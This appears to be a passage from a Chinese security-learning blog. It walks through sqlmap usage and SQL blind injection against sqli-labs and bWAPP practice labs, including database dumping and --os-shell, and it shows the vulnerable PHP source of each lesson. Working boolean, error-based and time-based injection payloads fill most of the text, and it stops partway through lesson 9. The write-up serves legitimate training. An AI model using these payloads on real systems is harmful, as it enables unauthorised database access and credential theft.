<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.149.136:86/Less-31/?id=1&quot;</span> --risk <span class="number">3</span> --level <span class="number">5</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231005191123-1zfk0mh.png" class="" title="image">

<h2 id="七：–privileges-–is-dba"><a href="#七：–privileges-–is-dba" class="headerlink" title="七：–privileges –is-dba"></a>七：–privileges –is-dba</h2><img src="/2023/10/23/SQLmap/image-20231005191202-8h2ygg6.png" class="" title="image">​

<p>–privileges 获取用户所具有的权限</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.149.136:86/Less-31/?id=1&quot;</span> --privileges</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231005191336-h5gdwlx.png" class="" title="image">​

<p>–is-dba判断当前的用户是否是dba</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.149.136:86/Less-31/?id=1&quot;</span> --<span class="keyword">is</span>-dba</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231005191448-p15h4f7.png" class="" title="image">​

<h2 id="八：–file-read-–file-write-–file-dest"><a href="#八：–file-read-–file-write-–file-dest" class="headerlink" title="八：–file-read –file-write –file-dest"></a>八：–file-read –file-write –file-dest</h2><img src="/2023/10/23/SQLmap/image-20231005191656-vdziq56.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005230757-9ej2llr.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005231205-pop3f0m.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005231251-krs0byv.png" class="" title="image">​

<h2 id="九：–os-cmd-–shell"><a href="#九：–os-cmd-–shell" class="headerlink" title="九：–os -cmd –shell"></a>九：–os -cmd –shell</h2><img src="/2023/10/23/SQLmap/image-20231005232447-aaxx6ds.png" class="" title="image">​

<h2 id="十：sqlmap实战"><a href="#十：sqlmap实战" class="headerlink" title="十：sqlmap实战"></a>十：sqlmap实战</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=md66uusp86462bmh516mfnupk7&quot;</span> </span><br><span class="line">-u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> --level <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231006200211-7j6i53f.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=md66uusp86462bmh516mfnupk7&quot;</span> </span><br><span class="line">-u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> --level <span class="number">3</span></span><br><span class="line">-dbs</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231006200304-57xjh3s.png" class="" title="image">​

<p>-D指定数据库，-tables查看数据库的表信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=md66uusp86462bmh516mfnupk7&quot;</span></span><br><span class="line"> -u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> --level <span class="number">3</span> -dbs</span><br><span class="line"> -D bWAPP -tables</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231006200608-4hilcre.png" class="" title="image">​

<p>-T指定表名，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=md66uusp86462bmh516mfnupk7&quot;</span> </span><br><span class="line">-u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> --level <span class="number">3</span> -dbs </span><br><span class="line">-D bWAPP -tables -T users --columns</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231006200815-25neunl.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=md66uusp86462bmh516mfnupk7&quot;</span> </span><br><span class="line">-u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> --level <span class="number">3</span> -dbs </span><br><span class="line">-D bWAPP -tables -T users --columns -C login,password</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231006201011-7809j16.png" class="" title="image">​

<p>脱库</p>
<img src="/2023/10/23/SQLmap/image-20231006202055-devvusj.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=md66uusp86462bmh516mfnupk7&quot;</span> </span><br><span class="line">-u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> --level <span class="number">3</span> -dbs </span><br><span class="line">-D bWAPP -tables -T users --columns -C login,password -dump-<span class="built_in">all</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="十一：sqlmap对于POST参数的注入"><a href="#十一：sqlmap对于POST参数的注入" class="headerlink" title="十一：sqlmap对于POST参数的注入"></a>十一：sqlmap对于POST参数的注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx.com/Login.asp --data <span class="string">&quot;n=1&amp;p=1&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.160.1/sqltest/post.php&quot;</span> --forms</span><br></pre></td></tr></table></figure>

<h2 id="十二：注入实战"><a href="#十二：注入实战" class="headerlink" title="十二：注入实战||"></a>十二：注入实战||</h2><img src="/2023/10/23/SQLmap/image-20231020092732-nomu173.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231020092743-1mftmwy.png" class="" title="image">​

<p>参数无论我们输入数字什么都只会回显<code>Array([0]= &gt; 1)</code>​，输入字母不会显，但是也没显示是过滤的，所以<code>query</code>​的值如果为非数字则无法正确查询得到数据回显，那么查询语句就应该长这样</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select &quot;.$post[<span class="string">&#x27;query&#x27;</span>].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231020092826-aempj3p.png" class="" title="image">​

<p>思路一：</p>
<p>||在SQL语句中表示或，在查询表中的字段内容时，逗号,用于查询多个字段名</p>
<img src="/2023/10/23/SQLmap/image-20231020092856-lzjwfxc.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231020092909-hwx7mvm.png" class="" title="image">​

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload<span class="operator">=</span><span class="operator">*</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231020092937-0wdhoqi.png" class="" title="image">​

<p>思路二：</p>
<p>通过修改SQL配置将或运算符||设置为连接符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231020093011-g399y88.png" class="" title="image">​

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>拼接完成的语句为：</p>
<p>select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag;</p>
<img src="/2023/10/23/SQLmap/image-20231020093258-v2pdmdn.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>SQL盲注</title>
    <url>/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><h1 id="一：定义"><a href="#一：定义" class="headerlink" title="一：定义"></a>一：定义</h1><p>sql盲注就是在sql注入过程中， sql语句执行的选择后，选择的数据不能回显到前端页面，那我们可以通过什么样的方式来获得我们需要的数据呢？通过本实验的学习，掌握SQL盲注的基本方法、常用函数以及测试流程</p>
<h3 id="1）SQL盲注介绍"><a href="#1）SQL盲注介绍" class="headerlink" title="1）SQL盲注介绍"></a>1）SQL盲注介绍</h3><pre><code>  盲注就是在sql注入过程中， sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为三种类型：基于布尔的SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。
</code></pre>
<h3 id="2）-关于SQL基础语句"><a href="#2）-关于SQL基础语句" class="headerlink" title="2） 关于SQL基础语句"></a>2） 关于SQL基础语句</h3><pre><code>  增：insert into tableName(columnName1,columnName2) values(value1,value2)

  删：delete from tableName where …

  改：update tableName set columnName=value where …

  查：select * from tableName where …
</code></pre>
<h3 id="3）-Information-schema数据库基本表说明："><a href="#3）-Information-schema数据库基本表说明：" class="headerlink" title="3） Information_schema数据库基本表说明："></a>3） Information_schema数据库基本表说明：</h3><pre><code>  schemata表：提供了当前mysql实例中所有的数据库信息，show databases的结果就是从该表得出。具体表可通过phpstudy中MySQL管理器查看。

  tables表：提供了关于数据库中的所有表的信息，即表属于哪个schema，表的创建时间、表的类型等，show tables fromschemaName的结果就是从该表得出。

  columns表：提供表中所有列信息，即表明了表中所有列及每列的信息，show columns from schemaName.tableName的结果就是从该表得出。
</code></pre>
<p>phpstudy介绍：      phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。</p>
<h1 id="二：实验一"><a href="#二：实验一" class="headerlink" title="二：实验一"></a>二：实验一</h1><p>任务描述： 突破lesson-5的实验，基于布尔型的SQL盲注，按照表-&gt;列-&gt;值的顺序，最后查看后台源代码。</p>
<p>根据提示加入id参数在url中，可以看到他不再像前面报错注入一样回显有效信息，而是一段you are in…的字符串。如果输入正确提示you are in…输入错误则会报错。同样我们加入单引号，可以看到报错了，报错信息中提示我们输入的id参数使用单引号闭合，我们后面加入注释符即可注释掉原本后面的SQL语句。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806150255-ouhc4av.png" class="" title="image">​

<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806150308-b7yq0j6.png" class="" title="image">​

<p>接着我们可以根据他是否报错来判断我们需查询的语句是否正确。<a href="http://localhost/sqli-labs-master/Less-5/?id=1%27and">http://localhost/sqli-labs-master/Less-5/?id=1&#39;and</a> left(version(),1)&#x3D;5–+可以看到数据库版本是大于等于5.0的。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806150639-zse5qp4.png" class="" title="image">​

<p>可以利用ascii及substr函数来判断substr所截取的字符串的ascii码值为多少，得出当前的字母，可以利用二分法快一点，同时也可直接利用burpsuite来爆破出当前值，当然也可以写脚本自己跑出来。<a href="http://localhost/sqli-labs-master/Less-5/?id=1%27and">http://localhost/sqli-labs-master/Less-5/?id=1&#39;and</a> ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100–+这里limit 0,1意味着取第一张表，如果我们想爆破第二张表即可使用limit 1,1 同时这里使用substr(str,start,length)函数截取的是字符串的第一个字符，若想截取第二个字符即可使用substr(str,2,1)依此类推。当我们取到第三张表，对其进行爆破时我们发现它的表名为users。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806151009-aks9tas.png" class="" title="image">​

<p>这时我们可以利用regexp正则匹配来获取users表中的列名。<a href="http://localhost/sqli-labs-master/Less-5/?id=1">http://localhost/sqli-labs-master/Less-5/?id=1</a>‘ and 1&#x3D;(select 1 from  information_schema.columns where table_name&#x3D;’users’ and column_name regexp  ‘^us[a-z]’ limit 0,1)–+将正则匹配到最后时即’^username’正确，即得到列名。也可尝试’^password’发现同样返回正确。如果想确定就是这个列名可使用’^username$’。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806151405-4ch1jc7.png" class="" title="image">​

<p>爆出列名之后，我们可以开始尝试试试对应列的值，这儿又使用其他的函数ord()，mid()，IFNULL()，CAST()，其中ord函数相当于ascii函数，求得最左边字符的ascii码；mid函数相当于substr函数，截取一段字符；IFNULL(a,b)函数是来判断，若a为空则返回b，若a不为空则返回a；CAST(str AS int)将字符串转换为目标数据类型，我们可以这样构造URL：<a href="http://localhost/sqli-labs-master/Less-5/?id=1">http://localhost/sqli-labs-master/Less-5/?id=1</a>‘ and ord(mid((select ifnull(cast(username as char),0x20) from users order by id limit 0,1),1,1))&#x3D;68–+</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806151706-a9iyz40.png" class="" title="image">​

<p>也可在burpsuite中爆破，这儿给出变量设置及最后结果展示图：</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806155901-n947btm.png" class="" title="image">​

<p>查对应的ascii表可得出第一个username为Dumb。剩下的也一样了。</p>
<p>切换到代码中来分析漏洞产生的原因：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在源代码中没有做任何防护，我们可以在构建SQL语句时闭合前面单引号，注释掉后面的内容。同时看到第33行查询到数据之后，不像之前展示出来，而是输出一段字符串you are in…</p>
<h1 id="三：实验二"><a href="#三：实验二" class="headerlink" title="三：实验二"></a>三：实验二</h1><p>任务描述： 突破lesson-6的实验，基于报错型及时间型的SQL盲注，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
<p>1.打开lesson-6，加入参数id，同时加入双引号，可通过查看报错情况得知SQL语句使用双引号闭合。不加入双引号时正常显示。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806155701-ts6r4u8.png" class="" title="image">​

<p>接下来可以按照实验任务一中的步骤进行爆值，这儿避免重复用报错注入及延时注入的方式。</p>
<p>2.首先报错注入，这里会列举floor()、extractvalue()、updatexml()、NAME_CONST()四种函数进行演示。这次使用floor函数， <a href="http://localhost/sqli-labs-master/Less-6/?id=1">http://localhost/sqli-labs-master/Less-6/?id=1</a>“ and (select 1 from (select count(*),(concat(database(),0x7e,floor(rand(0)**2)))x from information_schema.tables group by x)a)–+</p>
<p>FLOOR() 函数是SQL中的一个数学函数，用于将一个数值向下取整为最接近的较小整数。这个函数通常用于操作数值数据，特别是浮点数。</p>
<p>*<code>(concat(database(),0x7e,floor(rand(0)</code><em>​</em><code>2)))x</code>​</p>
<ol>
<li><code>database()</code>​ 函数用于获取当前数据库的名称。</li>
<li><code>0x7e</code>​ 表示字符波浪符号 <code>~</code>​ 的ASCII码。</li>
<li><code>floor(rand(0)*2)</code>​ 生成一个0到1*2之间的随机数，然后将其向下取整，结果为0或1。</li>
</ol>
<p>然后，这些值被连接在一起，构成一个字符串，表示为 <code>(数据库名~随机数)</code>​。最后的 <code>x</code>​ 是为了给这个构造的字符串取一个列名。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806161222-tgh6l0h.png" class="" title="image">

<p>3.还可以使用上一节中的extractvalue函数，<a href="http://localhost/sqli-labs-master/Less-6/?id=1">http://localhost/sqli-labs-master/Less-6/?id=1</a>“ and extractvalue(1,concat(0x7e,(select@@version),0x7e))–+</p>
<p>它试图通过 MySQL 的 EXTRACTVALUE() 函数从一个虚构的 XML 文档中提取版本信息。</p>
<p>EXTRACTVALUE() 函数是MySQL数据库中的一个函数，用于从一个XML文档中提取指定路径的值。但是需要注意的是，这个函数在某些情况下可能存在安全风险，因为它可以被用于进行XML注入攻击。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806162601-8cj1w1n.png" class="" title="image">​

<p>4.同样updatexml函数也可以，<a href="http://localhost/sqli-labs-master/Less-6/?id=1">http://localhost/sqli-labs-master/Less-6/?id=1</a>“ and updatexml(1,concat(0x7e,(select@@version),0x7e),1)–+</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806163007-x2jqju6.png" class="" title="image">​

<p>5.利用数据重复报错也可以，使用NAME_CONST函数。<a href="http://localhost/sqli-labs-master/Less-6/?id=1">http://localhost/sqli-labs-master/Less-6/?id=1</a>“ and (select 1 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)–+</p>
<p>NAME_CONST 是 MySQL 数据库中的一个函数，用于创建一个具有指定名称和值的参数。它通常用于在 SQL 查询中使用命名参数，从而使查询更加清晰和易于理解。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806175921-2jjv83e.png" class="" title="image">​

<p>6.报错注入举了前面的例子，当然还有很多，等你去发现。下面可以尝试延时注入，延时注入可以使用sleep函数，以及benchmark函数，首先看一下sleep函数，可以使用<a href="http://localhost/sqli-labs-master/Less-6/?id=1">http://localhost/sqli-labs-master/Less-6/?id=1</a>“ and if(mid(user(),1,1) like ‘l’,sleep(5),1)–+</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806180541-zxaxigl.png" class="" title="image">​

<p>7.接下来可以试试benchmark函数，<a href="http://localhost/sqli-labs-master/Less-6/?id=1">http://localhost/sqli-labs-master/Less-6/?id=1</a>“ union select (if(substring(db,1,1)&#x3D;char(115),benchmark(10000000,sha(1)),null)),2,3 from (select database() as db) as a–+</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806181746-32zeo1e.png" class="" title="image">​

<p>8.切换到代码中来分析漏洞产生的原因：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>同样没有做任何过滤，可以看到id用双引号包起来之后，传入SQL查询语句，36行代码处也只显示you are in…字符串。</p>
<h1 id="四：实验三"><a href="#四：实验三" class="headerlink" title="四：实验三"></a>四：实验三</h1><p>任务描述： 突破lesson-8的实验，基于布尔型、延时型的SQL盲注，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
<ol>
<li><p>打开lesson-8，加入参数id，正常显示：<a href="http://localhost/sqli-labs-master/Less-8/?id=1%E8%80%8C%E5%BD%93%E5%8A%A0%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%97%B6%EF%BC%8C%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%EF%BC%8C%E5%8D%B4%E6%B2%A1%E6%9C%89%E6%8F%90%E7%A4%BA%E9%94%99%E8%AF%AF%E7%9A%84%E5%9C%B0%E6%96%B9%E3%80%82">http://localhost/sqli-labs-master/Less-8/?id=1而当加入单引号时，出现错误，却没有提示错误的地方。</a></p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806184335-13oyq1x.png" class="" title="image">​

<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806184351-v4x8efk.png" class="" title="image">​
</li>
<li><p>那么我们除了不能使用报错注入之外，其余的延时注入、布尔型注入同样都是可以使用的。<a href="http://localhost/sqli-labs-master/Less-8/?id=1">http://localhost/sqli-labs-master/Less-8/?id=1</a>‘ and left(version(),1)&#x3D;5–+</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230806185129-sx5y647.png" class="" title="image">
</li>
<li><p>接下来的步骤和前面任务一、二的步骤就一样了，这里不再赘述。</p>
</li>
<li><p>我们去代码层查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到44、45、46行报错的信息被注释掉了。同样在SQL查询语句中没有做任何防护，除了报错注入不能使用，他不会返回错误信息之外，基于布尔值的注入，基于时间的注入都能使用。</p>
</li>
</ol>
<h1 id="五：实验四"><a href="#五：实验四" class="headerlink" title="五：实验四"></a>五：实验四</h1><p>任务描述： 突破lesson-9的实验，基于延时型的SQL盲注，按照表-&gt;列-&gt;值的顺序。查看后台源代码</p>
<p>1.打开lesson-9，加入参数id，正常显示：<a href="http://localhost/sqli-labs-master/Less-9/?id=1%E8%80%8C%E5%BD%93%E5%8A%A0%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%97%B6%EF%BC%8C%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%90%8C%E3%80%82">http://localhost/sqli-labs-master/Less-9/?id=1而当加入单引号时，也没有任何不同。</a></p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230807152049-z1f9t7h.png" class="" title="image">​

<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230807152102-godfe8s.png" class="" title="image">​

<p>2.我们可以看到它的源代码中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>无论是否出错都会显示出you are in…故我们也不能通过基于布尔型的盲注，通过语句构建正确错误时页面的不同展示来判断了，只能使用最后一招延时注入。</p>
<p>这个延迟注入我的相应都是两秒，不知道为啥，那倒是sql语句输入错了？</p>
<p>3.延时注入，首先猜测表名：<a href="http://localhost/sqli-labs-master/Less-9/?id=1">http://localhost/sqli-labs-master/Less-9/?id=1</a>‘ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1,1))&#x3D;117,1,sleep(5))–+     得到第三张表的表名第一个字符为u，此处报错才延时5秒，若猜对直接返回。</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230807152714-pr8lfhf.png" class="" title="image">​

<p>‍</p>
<p>第二个字符：<a href="http://localhost/sqli-labs-master/Less-9/?id=1">http://localhost/sqli-labs-master/Less-9/?id=1</a>‘ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),2,1))&#x3D;115,1,sleep(5))–+     得到第三张表的表名第二个字符为s</p>
